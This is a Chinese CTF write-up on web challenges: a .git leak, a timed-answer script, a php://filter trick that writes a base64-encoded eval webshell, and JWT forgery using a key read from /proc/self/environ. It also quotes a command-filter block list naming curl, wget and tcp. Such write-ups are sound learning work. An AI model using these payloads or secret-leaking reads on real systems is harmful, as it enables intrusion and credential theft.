---
author: "Yiming Shen"
date: 2021-10-21
lastmod: 2021-10-22
title: "CNSS Recruit-Web Write UP"
tags: [
    "CTF",
    "WriteUP",
    "Web",
    "Note",
]
categories: [
    "Notes",
     "CTF",
]
math: true
typora-root-url: ..\..\..\..\static\
---

## 前言

躺在床上，不想动鼠标，那就先写写前言吧。

这个CTF比赛是我打的第二场比较正规、完整的比赛。

惨不忍睹，当然，作为刚入门的noob来说也可以接受。

希望能通过笔记的整理消化新掌握的知识，道阻且长。

## [👶Baby]GitHacker

根据题目名，应该是考察Git泄露相关知识。

### 关于工具Githack的使用和Python2/3的同时安装

使用工具Githack下载网站/.git下所有内容，注意Githack脚本使用python2编写，两个版本共存的方法是，在正常安装Python3的基础上，再安装Python2，将目录添加至环境变量后，将执行文件名修改为`python2.exe`，则在pws中输入`python`是运行python3，输入`python2`则是运行Python2.

![1](/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211020222625834.png)

``` shell
python2 .\GitHack.py http:\\x.x.x\.git
```

运行后即得到git目录。

### Git版本管理

这个地方困扰我很久，但也因此学到了很多之前一直想学但没机会的Git使用方式。

```shell
git log 
# 查看提交记录（版本号）
git status
# 查看本地修改记录
git reset --hard 目标版本号
# 退回目标版本号
git reset HEAD
# 回退到最早版本
git checkout
# 还原与版本记录不符的所有文件
git restore 目标文件名
# 还原与版本记录不符的目标文件
```

这道题只需要回退到最早版本并checkout，即可得到未修改过的index.html，flag以CNSS{XXX}的形式隐藏在源代码中，注意，要搜`CNSS`而不是`flag`。

### 其他Githack脚本

在CTF中推荐`Git_Extract-master`这个脚本，可以在下载目录的同时，恢复所有文件版本，省去了`git reset`和`git checkout`的过程。

## [😃Easy]更坑的数学题

![image-20211020221052004](/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211020221052004-16347390601511.png)

仅有的提示就是快速把结果提交，有可能会出现flag。

第一反应是绕过和注入咯，尝试后无果。

再观察续一秒按钮前端代码，发现是安慰剂按钮。。。

那就只有在1s内做出答案了，算是个Brute Force吧，下面是丁佬的python代码：

```python
import requests
import re # 正则表达式库
import string

from requests.sessions import session

url = 'http://81.68.109.40:30005/'
session = requests.session()
# 保持会话
req = session.get(url=url)
# 导入URL，创建会话，结果存储在req中
prog = re.compile('\d{8}')
# 初始化正则表达式为匹配连续出现8次的数字

group = prog.findall(req.text)
# 将结果存入数组

sum = int (group[0])*int(group[1])
# 计算结果
str=str(sum)
data={
    'res':str
}
# 构建post的payload
r=session.post(url=url,data=data)
# 发送post请求，返回内容存入r中
print(r.text)
```

这又是一个利用python做题的重要例子，对于python的学习应用要加强，应当抽时间写爬虫实战以练习。

## [😮Mid]太极掌门人

网页给出代码如下：


``` php
<?php
    error_reporting(0);
    show_source(__FILE__);

    function deleteDir($path) {

        if (is_dir($path)) {
            $dirs = scandir($path);
            foreach ($dirs as $dir) {
                if ($dir != '.' && $dir != '..') {
                    $sonDir = $path.'/'.$dir;
                    if (is_dir($sonDir)) {

                        deleteDir($sonDir);

                        @rmdir($sonDir);

                    } elseif ($sonDir !== './index.php'
                            && $sonDir !== './flag.php') {

                        @unlink($sonDir);

                    }
                }
            }
            @rmdir($path);
        }
    }

    $devil = '<?php exit;?>';

    $goods = $_POST['goods'];

    file_put_contents($_POST['train'], $devil . $goods);

    sleep(1);

    deleteDir('.');

?>
```

关键代码：`file_put_contents`写入文件，妥妥的文件上传漏洞。

我们构造命令以绕过exit函数，具体参考13.RCE专栏。

``` php
?train=php://filter/convert.base64-decode/resource=1.php&goods=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==
```

此时PHP执行的命令为：

```php
file_put_contents("php://filter/convert.base64-decode/resource=1.php", '<?php exit;?>'."aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==");
```

我们在PHP中运行一下，发现成功在目录下写入了有命令执行![img](/14.CNSS%20Recruit-Web%20Write%20UP.assets/00E290DA.png)的PHP脚本。

由于这是一个静态靶机，为了减轻服务器负担，故而有删除目录命令的存在，定时清空网站根目录，因此我们要在清空之前连入shell脚本，读取flag.php文件内容，拿到flag。

![image-20211021205217701](/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211021205217701.png)



## [😮Mid]BlackPage

查看源代码，发现hint：查看myblackdoor.php



```php
<?php
error_reporting(0);
function blacklist($cmd){
  $filter = "(\\<|\\>|Fl4g|php|curl| |0x|\\\\|python|gcc|less|root|etc|pass|http|ftp|cd|tcp|udp|cat|×|flag|ph|hp|wget|type|ty|\\$\\{IFS\\}|index|\\*)";
  if (preg_match("/".$filter."/is",$cmd)==1){  
      exit('Go out! This black page does not belong to you!');
  }
  else{
    system($cmd);
  }
}
blacklist($_GET['cmd']);
?>
```



## [😮Mid]To_be_Admin

![image-20211022100859610](/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211022100859610.png)

页面左下角有/read字样，打开后提示用get参数传入file即可读取指定文件：

![image-20211022101753988](14.CNSS Recruit-Web Write UP.assets/image-20211022101753988.png)

尝试后，未发现注入点，直接读取`flag.php`显示禁止访问，未找到过滤方法。

我们用burp抓包后发现，网站的cookie可以被读取查看：

![image-20211022102237323](/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211022102237323.png)

应用base64解码后发现文本可读，搜索JWT发现这是一种验证算法。

![image-20211022103012757](/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211022103012757.png)

> Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（[(RFC 7519](https://link.jianshu.com?t=https://tools.ietf.org/html/rfc7519)).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。

在JWT.io中可以对其进行详细编辑。jwt分为三部分，头部(header)，载荷(payload)，签名(signature)，签名是根据头部和载荷，加上密钥(key)后按照指定算法生成，如此JWT使用HS256算法。

![image-20211022103113965](/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211022103113965.png)

在不知道密钥的情况下，我们可以使用JWT cracker暴力破解，我使用java版cracker CPU占用率100%跑了一中午并未出结果，毕竟几率渺茫。

![img](/14.CNSS%20Recruit-Web%20Write%20UP.assets/4D40723418BF7990649568A57505D53A.jpg)

正确方法应当是找到网站中隐藏的key。

我们了解一下proc文件系统：

> 通过/proc/\$pid/来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/$pid/目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的系统信息，而不用每次都获取pid。

由于此网站后端是用python写的，在生成token时调用的密钥必然存在系统中，我们要做的就是找到并查看系统环境变量：

```php
?file=/proc/self/environ
# prco是进程目录（linux进程以文件形式存放），self是当前运行进程，environ是环境变量
```

![image-20211022110601481](14.CNSS Recruit-Web Write UP.assets/image-20211022110601481.png)

在第一行发现密钥KEY：`nWMfdan2349r*fn9dMz`

这……怎么可能暴力碰出来呢。

进入jwt.io，修改`username=admin`，用该密钥生成新的jwt，传入token，放包

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IkFkbWluIn0.1kMTURzATts34snMro5E2MvNRM46lY0S1Ez4iSmp2_s
```

拿到flag。



## 参考

[1] [正则表达式语法-RUNNOOB](https://www.runoob.com/regexp/regexp-syntax.html)

[2] [Git恢复本地被误删文件](https://www.cnblogs.com/yangshifu/p/9680993.html)

[3] [Proc文件系统详解](https://blog.csdn.net/Zero_Adam/article/details/114853022)



